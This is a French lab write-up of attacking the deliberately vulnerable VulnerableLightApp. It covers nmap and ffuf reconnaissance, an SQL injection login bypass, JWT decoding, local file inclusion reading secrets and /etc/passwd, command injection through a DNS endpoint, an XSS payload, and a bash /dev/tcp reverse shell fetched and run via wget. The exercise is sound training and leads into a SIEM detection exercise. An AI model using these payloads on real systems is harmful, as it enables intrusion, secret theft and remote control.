> [!WARNING]
> * L'ensemble de ce brief à été effectué sur une application faite pour exploiter des failles de sécurité.
> * L’exploitation de vulnérabilités et de failles applicatives doit se faire uniquement dans un environnement contrôlé.

<br>

> [!NOTE]
> Retrouver l'ensemble du projet ici : [VulnerableLightApp](https://github.com/Aif4thah/VulnerableLightApp)


<br>


# __I. PHASE DE RECONNAISSANCE__

<br>

## __SCANNER POUR DÉCOUVRIR__ (nmap)



### Scan détection des services et versions

```sh
sudo nmap -sS -sV -p- -T4 <IP> 
```
![alt text](<nmap service.png>)

### Scan agressif (OS, version, scripts) — plus bruyant
```sh
sudo nmap -sS -A -p- -T4 <IP>
```

![alt text](<nmap more detailed services.png>)




<br>



## __ÉNUMÉRATION__


### Rappel des codes de réponses web

| Code HTTP | Interprétation |
|-----------|----------------|
| 200       | Accessible |
| 301 / 302 | Existe, redirige |
| 401 / 403 | Existe, protégé |
| 404       | Probablement inexistant |
| 405       | Action non autorisée |
| 500       | Bug exploitable potentiel |

<br>

### Téléchargement des listes d'énumérations 

```sh
sudo apt update
sudo apt install seclists
```
listes installées dans /usr/share/seclists

Télécharger directement depuis GitHub  
```sh
git clone https://github.com/danielmiessler/SecLists.git 
```

<br>

### Énumération avec FFUF


* Il est possible d'énumérer avec burp ici j'ai choisi ffuf
* ffuf est un outil spécialisé dans les injections SQL, il permet aussi d'énumérer les Endpoints et fichiers d'une appli.

```sh
apt install ffuf -y
```

| Option | Nom            | Description |
|-------:|----------------|-------------|
| -w    | Wordlist        | Fichier de mots à tester (dictionnaire) |
| -u    | URL             | URL cible avec le mot-clé `FUZZ` |
| -mc   | Match Code      | Affiche seulement les réponses avec ces codes HTTP |
| -fc   | Filter Code     | Masque les réponses avec ces codes HTTP |
| -ms   | Match Size      | Affiche seulement les réponses d’une taille donnée |
| -fs   | Filter Size     | Masque les réponses d’une taille donnée |
| -mw   | Match Words     | Filtre selon le nombre de mots |
| -fw   | Filter Words    | Masque selon le nombre de mots |
| -ml   | Match Lines     | Filtre selon le nombre de lignes |
| -fl   | Filter Lines    | Masque selon le nombre de lignes |
| -t    | Threads         | Nombre de requêtes simultanées |
| -r    | Follow Redirect | Suit les redirections HTTP |
| -k    | Insecure TLS    | Ignore les erreurs de certificat SSL |
| -v    | Verbose         | Mode verbeux (affiche plus d’infos) |
| -c    | Color           | Active la coloration de sortie |
| -o    | Output          | Fichier de sortie |
| -of   | Output Format   | Format de sortie (json, csv, html, md) |
| -H    | Header          | Ajoute un header HTTP personnalisé |
| -X    | Method          | Méthode HTTP (GET, POST, PUT…) |
| -d    | Data            | Données envoyées (POST, PUT…) |
| -timeout | Timeout      | Temps max d’attente par requête |

<br>

![img](<ffuf.png>)

Énumérer avec une liste de mots connus d'API
```sh
ffuf  -k -r -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt  -u https://192.168.0.17:3000/FUZZ -mc 200,301,302,401,403 -fc 404
```

Ici on peut voir que l'énumération permet de retrouver le endpoint `swagger` et `/swagger/v1/swagger.json` qui est un fichier important

![image](<ffuf_enum.png>)

Afficher le fichier swagger.json énuméré précédemment 
```sh
curl -k https://192.168.0.17:3000/swagger/v1/swagger.json
```

**Ce fichier est contenu dans l'API et n'est pas destiné à être affichée en html (ne s'affichera pas sur une page web), mais il représente une carte complète de la surface d’attaque de l’API**

* On peut y voir les méthodes exactes pour appeler les Endpoints :
  * GET /Employee?i=...
  * POST /Login (JSON)
  * POST /Invoice (JSON structuré)
  * PATCH /Patch (upload de fichier)

* Les paramètres intéressants qui peuvent servir pour des attaques SQLi, LFI/RFI, XSS (si reflété), RCE...
  * i (string, souvent dangereux)
  * lang
  * champs texte (owner, client, activity)

<br>

Voici une partie extraite du fichier :
```json
"/LocalDNSResolver": {
  "get": {                         // Endpoint accessible via HTTP GET
    "tags": [
      "VulnerableWebApplication"   // Regroupement logique (pure documentation)
    ],
    "parameters": [
      {
        "name": "i",               // Paramètre attendu : i
        "in": "query",             // Passé dans l’URL (?i=...)
        "required": true,          // Obligatoire → pas de valeur par défaut
        "schema": {
          "type": "string"         // Type libre → fort risque d’injection
        }
      }
    ],
    "responses": {
      "200": {
        "description": "OK",       // L’appli considère toujours la requête comme valide
        "content": {
          "application/json": {
            "schema": { }          // Aucun schéma défini → réponse non contrôlée

```



---


<br>


# __II. GAIN ACCESS__

<br>

## __SQL INJECTION__

### Vérifier si l'appli est vulnérable à l'injection dans le champs utilisateur

* En mettant un `'` dans le nom d'user (Exemple: tot'o) on obtient ici une erreur 500.
* L'Erreur 500 reflète une erreur interne du serveur
* Essayer des injections dans le champ utilisateur
* Essayer d'avoir une réponse 200 de l'application et de pouvoir s'authentifier.
* Le champ password n'est pas injectable de cette façon car il utilise les hash

<br>

Le champ de Login est l'endroit où injecter le payload:

![alt text](<LoginFieldSQLi.png>)

```
{
  "user": "toto' OR '1'='1" ,
  "passwd": "string"
}
```
Cette injection transforme la requête SQL en une condition toujours vraie. Voici ce qui peut se passer coté backend SQL :
```sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'
AND password = '...';
```
<br>

Si l'injection fonctionne on obtient une réponse de la BDD, et le serveur web applicatif renvoit un succès `HTTP 200`

Cet exploit nous permet de récupérer un `token JWT` qui va nous permettre de s'autentifier.

![alt text](<Response200.png>)

<br>


Pour en savoir plus sur les injections SQL, consulter cette [liste des payloads connues](https://github.com/payloadbox/sql-injection-payload-list)




<br>




## __CONSTRUCTION D'UN TOKEN JWT__

header.payload.signature

* Header → algorithme + type de token
* Payload → données (infos utilisateurs)
* Signature → intégrité/authenticité


<br>

* __HEADER__

  * C'est la première partie du token, elle en base64url donc non chiffrée                                           
  `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

  * Ce qui donne en décodé :
  ```
  {"alg":"HS256","typ":"JWT"}
  ```

  Indique que le type de token et qu’il utilise l’algorithme de signature HMAC-SHA256.


<br>

* __PAYLOAD__

  * C'est la partie centrale du token, ces infos sont en aussi base64url  
  `eyJJZCI6InRvdG8nIE9SICcxJz0nMSIsIklzQWRtaW4iOiJGYWxzZSIsIm5iZiI6MTc2NTUyODk3MiwiZXhwIjoxNzk3MDY0OTcyLCJpYXQiOjE3NjU1Mjg5NzJ9`

  * Ce qui donne en décodé :
  ```
  {"Id":"toto' OR '1'='1","IsAdmin":"False","nbf":1765528972,"exp":1797064972,"iat":1765528972}
  ```


<br>

* __SIGNATURE__

  * C'est la dernière partie du token, elle combine le header et le payload avec une clé secrète
  `C8MDRJOu0W8osI5ZTnd2nKLpv2bCzWcLOCuw1IePP0o`
 
  ```
  HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
  ```

<br>

![alt text](<jwtexplained.png>)




<br>




## __S'AUTHENTIFIER AVEC LE TOKEN__

### Modifier la requête dans le repeater avec Burp

```html
GET / HTTP/2
Host: <IP>:3000
Authorization: Bearer <Token>
Accept: application/json
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
```

![alt text](<TokenInRequest.png>)



S'authentifier dans le naviguateur de Burp

![alt text](<navigateur_auth.png>)

Actualiser le navigateur Burp :

![alt text](<nav_auth.png>)



S'authentifier depuis un shell :
```sh
curl -k -i -H "Authorization: Bearer <Token>" "https://<IP>:3000/"
``` 

![alt text](<curl.png>)


__Trouver comment trouver le fichier "appsettings.json"__




<br>



## __LOCAL FILE INCLUSION__

La `LFI` est une vulnérabilité de gauche, (ok j'arrête) qui permet d'utiliser un paramètre d'une application web et d'en détourner son usage.

Ici on utilise le paramètre `lang` pour afficher des fichiers locaux d'une l'application

```
https://<IP>:3000/?lang=appsettings.json
```

Cette vulnérabilité peut permettre de récolter des informations importantes

Ici on peut voir que ce fichier contient le secret du token VLA :

![alt text](<tokensecret.png>)


<br>


## __PATH TRAVERSAL__


* La vulénaribilté `LFI` permet aussi d'effectuer du `Path Traversal`
* Il est possible de naviguer vers les fichiers de la machine

Ici le contenu du fichier `/etc/passwd`

![alt text](<Path_Traversal.png>)

__Depuis un shell__
```sh
curl -k -i -H "Authorization: Bearer <Token>" https://<IP>:3000/?lang=/etc/passwd
```

![alt text](<Shell_path_Tra.png>)


<br>

Options pour curl

| Option | Nom / Type | Description |
|------|------------|-------------|
| -I | HEAD | Envoie une requête HEAD (headers uniquement, pas de body) |
| -i | Include | Affiche les headers **+** le corps de la réponse |
| -k | Insecure | Ignore la validation du certificat TLS |
| -H | Header | Ajoute un header HTTP personnalisé |
| -X | Method | Force la méthode HTTP (GET, POST, PUT, DELETE…) |
| -d | Data | Envoie des données (POST par défaut) |
| --data-urlencode | Data | Encode automatiquement les paramètres |
| -u | Auth | Authentification HTTP user:password |
| -b | Cookie | Envoie des cookies |
| -c | Cookie jar | Sauvegarde les cookies reçus |
| -L | Location | Suit les redirections |
| -s | Silent | Mode silencieux (pas de progression) |
| -v | Verbose | Affiche les échanges détaillés (debug HTTP) |
| -o | Output | Écrit la réponse dans un fichier |
| --compressed | Compression | Accepte gzip/deflate |

<br>




## __REMOTE COMMAND EXECUTION__

La vulnérabilité RCE permet d'effectuer des commandes sur la machine distante depuis l'URL

Utilisation du Endpoint LocalDNSResolver de VLA

![alt text](<dnsresolver.png>)

<br>

Le Endpoint LocalDNSResolver de VLA utilise une regex pour accepter le paramètre d'entrée utilisateur
```sh
^(?:[a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}(?:.{0,100})$
```
Utiliser le site [regex101](<https://regex101.com/>) pour s'aider


<br>

Ici le fichier controller.cs (C#) qui est une partie du code source pour le endpoint LocalDSNResolver:
```C
Effectue une requête DNS pour le FQDN passé en paramètre
            */
            if (Regex.Match(UserStr, @"^(?:[a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}(?:.{0,100})$").Success)
            {
                Process Cmd = new Process();
                Cmd.StartInfo.FileName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "powershell" : "/bin/sh";
                Cmd.StartInfo.RedirectStandardInput = true;
                Cmd.StartInfo.RedirectStandardOutput = true;
                Cmd.StartInfo.CreateNoWindow = true;
                Cmd.StartInfo.UseShellExecute = false;
                Cmd.Start();
                Cmd.WaitForExit(200);
                Cmd.StandardInput.WriteLine("nslookup " + UserStr);
                Cmd.StandardInput.Flush();
                Cmd.StandardInput.Close();
```
* Le code source ouvre un terminal pour exécuter nslookup
* Le paramètre `UserStr` attend une entrée utilisateur ce qui n'est pas conseillé au niveau backend
* L'entrée normale attendue serait un nom de domaine  (ex: `taisen.fr`)
* Étant mal programmée, la regex est plus permissive que prévu et permet d'insérer d'autre caractères
* Le endpoint LocalDNSResolver peut être utiilisé pour effectuer des commandes à distance dans terminal du serveur
* Ici un simple `;` permit par la regex nous permet d'exécuter la commande `id`

<br>

Cette vulnérabilité peut permettre :
  * D'installer/supprimer des programmes/outils (wget, apt install...)
  * De cartographier le réseau de la machine distante
  * Ajputer un utilisateur pour créer une backdoor
  * Rajouter une cléf SSH (backdoor aussi)
  * Accéder aux dossiers de la machine...
  * Regarder les droits auxquels on accès (whoami /all)
  * Effectuer/Télécharger un script d'élèvation de privilège




<br>

Le faire dans un shell 
```sh
curl -k -i -H "Authorization: Bearer <Token>" "https://192.168.0.17:3000/LocalDNSResolver?i=simplon.co;id"
```

<br>

__Rendre une URL valide avec l'encodage__

* Ici, la commande `ip a` doit utiliser l’encodage URL `%20` pour remplacer l’espace, afin que l’URL soit valide et transmise correctement au serveur
* Une fois reçue, l’application décode l’URL, puis la chaîne devient `ip a` et est ensuite interprétée par le shell côté serveur.
```sh
curl -k -i  -H $Header "https://192.168.0.17:3000/LocalDNSResolver?i=t.fr;ip%20a"
```



<br>


__Encodage dans l’URL__

| Caractère | Encodage URL | Usage courant |
|----------|--------------|---------------|
| espace   | %20          | séparation d’arguments |
| ;        | %3B          | séparation de commandes |
| &        | %26          | exécution en arrière-plan / concat |
| \|       | %7C          | pipe |
| >        | %3E          | redirection sortie |
| <        | %3C          | redirection entrée |
| `        | %60          | substitution de commande |
| $        | %24          | variable / substitution |
| (        | %28          | sous-shell |
| )        | %29          | sous-shell |
| {        | %7B          | blocs / expansions |
| }        | %7D          | blocs / expansions |
| '        | %27          | quote simple |
| "        | %22          | quote double |
| \        | %5C          | échappement |
| newline  | %0A          | séparation de commandes |


<br>

Ici depuis Burp

![alt text](<RCE.png>)




<br>




## __XSS__

Le __Cross-Site Scripting__ sert à injecter du JavaScript malveillant dans une page web vue par d’autres utilisateurs

Cette vulnérabilité peut permettre de :
* Voler des cookies / tokens → se faire passer pour l’utilisateur.
* Modifier l’apparence de la page → fausses fenêtres de login, phishing.
* Exécuter des actions à la place de l’utilisateur → en utilisant sa session.
* Scanner l’environnement de la victime (extensions, IP interne via WebRTC, etc.).

Elle s'utilise directement dans l'URL

```java
<marquee onstart=alert(1)>Ma 1ere XSS</marquee>
```

<marquee onstart=alert(1)>Ma 1ere XSS</marquee>


<br>

On peut voir que cette XSS permet d'afficher un message sur la page web de l'utilisateur :

![alt text](<XSS.png>)





<br>


## __REVERSE SHELL__



La connexion part de la machine victime, et se connecte à la machine d'attaque.


Dans ce cas il faut avoir récupéré un token utilisateur et s'être assuré que le serveur victime est vulnérable aux attaques RCE.


Mettre la machine attaquant sur écoute (port 4999)
```sh
nc -lnvp 4999
```

![img](<netcat_ecoute.png>)



<br>

Si ce code est exécuté coté victime et que l'attaquant écoute le reverse shell fonctionnera
```sh
bash -i >& /dev/tcp/192.168.0.19/4999 0>&1
```



Télécharger le script RevShell.sh avec la faille RCE sur la machine distante
```sh
Header="Authorization: Bearer <token>"
curl -k -i -H $Header "https://192.168.0.17:3000/LocalDNSResolver?i=t.fr;wget%20https://raw.githubusercontent.com/ZeryAzery/HitThePrompt/refs/heads/main/Linux/RevShell.sh"
```

Donner les droits au script RevShell.sh
```sh
curl -k -i -H $Header "https://192.168.0.17:3000/LocalDNSResolver?i=t.fr;chmod%20+x%20RevShell.sh" 
```
Exécuter le script
```sh
curl -k -i -H $Header "https://192.168.0.17:3000/LocalDNSResolver?i=t.fr;./RevShell.sh"
```

![img](<revshell_ok.png>)



<br>

### Les logs VLA sont visibles ici

```
VulnerableLightApp/bin/Debug/net8.0/Logs/*logfile.json
```

---

* Le [TP suivant](https://github.com/ZeryAzery/HitThePrompt/blob/main/Exo_AIS/SIEM/Retrouver_des_incidents.md) consiste à retrouver les logs générés par VLA depuis un SIEM
* Le but pour la suite est de pouvoir retouver les attaques dans les logs :  SQLI, Swagger, LFI, Command Injection, XSS...
